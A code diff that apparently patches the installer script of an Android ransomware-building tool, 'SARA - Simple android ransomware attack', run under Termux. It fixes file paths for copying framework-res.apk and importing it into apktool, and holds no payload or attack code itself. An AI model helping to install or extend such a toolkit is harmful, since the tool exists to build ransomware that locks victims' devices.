@@ -12,6 +12,7 @@ w="\033[0m"
 transparent="\e[0m"
 
 DIR=$HOME
+DI=/data/data/com.termux/files/home
 null="> /dev/null 2>&1"
 
 function check_root() {
@@ -27,9 +28,9 @@ fi
 }
 clear
 echo -e $r"Please Wait..!! "$transparent
-cp -R $DIR/SARA $DIR/SARA
+cp -R $DI/SARA $DIR/SARA
 echo -e $r"Copy framework_res.apk"$transparent
-cp /system/framework/framework-res.apk $DIR/SARA/1.apk
+cp /system/framework/framework-res.apk $DI/SARA/1.apk
 echo
 echo -e $b">"$w" SARA - Simple android ransomware attack"
 echo -e $b">"$w" prepare for installing dependencies ..."
@@ -62,7 +63,7 @@ ln -s $DIR/SARA/.data/apktool $PREFIX/bin/
 ln -s $DIR/SARA/.data/binaries/java $PREFIX/bin/
 
 echo -e $r"Import Framework "$transparent
-sh $DIR/SARA/.data/apktool if $DIR/SARA/1.apk
+sh $DIR/SARA/.data/apktool if $DI/SARA/1.apk
 echo
 echo -e $g" [*] DONE!"
 sleep 1
